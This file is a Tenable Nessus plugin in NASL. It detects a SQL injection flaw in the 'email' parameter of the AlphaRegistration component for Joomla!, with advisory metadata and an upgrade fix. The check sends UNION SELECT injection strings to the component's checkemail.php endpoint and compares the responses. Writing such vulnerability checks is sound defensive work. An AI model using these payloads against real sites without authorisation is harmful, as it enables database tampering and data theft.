#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(55669);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2017/05/19 13:58:06 $");

  script_bugtraq_id(48862);
  script_osvdb_id(74044);

  script_name(english:"AlphaRegistration Component for Joomla! 'email' Parameter SQLi");
  script_summary(english:"Attempts to exploit the vulnerability when validating an email address.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the AlphaRegistration Component for Joomla! running on
the remote host is affected by a SQL injection vulnerability in
assets/scripts/checkemail.php due to improper sanitization of
user-supplied input to the 'email' parameter before using it to
construct database queries. Provided the PHP 'magic_quotes_gpc'
setting is disabled, an unauthenticated, remote attacker can exploit
this issue to manipulate database queries, resulting in disclosure of
sensitive information, modification of data, or other attacks against
the underlying database.");
  script_set_attribute(attribute:"see_also", value:"https://forum.joomla.org/viewtopic.php?f=432&t=636467");
  # https://web.archive.org/web/20140322073100/http://www.alphaplug.com/index.php/forum/29-general-questions-about-alpharegistration/16489-alpharegistration-in-vulnerable-extensions.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?0c895c08");
  # https://web.archive.org/web/20150321141242/http://alphaplug.com/index.php/all-news/1-latest-news/206-alpharegistration-2014-released-.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e3425433");
  script_set_attribute(attribute:"solution", value:
"Upgrade to AlphaRegistration version 2.0.14 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/07/17");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/07/25");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/07/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url =  build_url(port:port, qs:dir);

# Verify component is installed
plugin = "AlphaRegistration";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list('#alpharegistration1');
  checks["/components/com_alpharegistration/assets/css/registration_css.css"]=regexes;

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );

}
if (!installed) audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " component");

# Try to exploit the issue to get a rejection.
script_test = SCRIPT_NAME - ".nasl";
exploit_alreadyexists = script_test + "' UNION SELECT 1 -- '";
exploit_ok = script_test + "' UNION SELECT 0 -- '";

url = '/components/com_alpharegistration/assets/scripts/checkemail.php';
postdata = 'email=' + str_replace(find:" ", replace:"+", string:exploit_alreadyexists);

res = http_send_recv3(
  method  : "POST",
  port    : port,
  item    : dir + url,
  data    : postdata,
  content_type : 'application/x-www-form-urlencoded',
  exit_on_fail : TRUE
);

if (
  '<font color="red">' >< res[2] ||
  'This email is already in use.' >< res[2]
)
{
  req1 = http_last_sent_request();
  # Now try to exploit the issue to have the email address accepted.
  postdata2 = 'email=' + str_replace(find:" ", replace:"+", string:exploit_ok);

  res2 = http_send_recv3(
    method  : "POST",
    port    : port,
    item    : dir + url,
    data    : postdata2,
    content_type : 'application/x-www-form-urlencoded',
    exit_on_fail : TRUE
  );

  if (egrep(pattern:"^OK$", string:res2[2]))
  {
    req2 = http_last_sent_request();

    security_report_v4(
      port        : port,
      severity    : SECURITY_WARNING,
      line_limit  : 2,
      sqli        : TRUE,
      generic     : TRUE,
      request     : make_list(req1, req2),
      output      : chomp(res2[2]),
      rep_extra   : '\nNote that the first request is used to verify that a rejection is\nreceived, then the second request attempts to have the email\naddress accepted.'
    );
    exit(0);
  }
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " component");
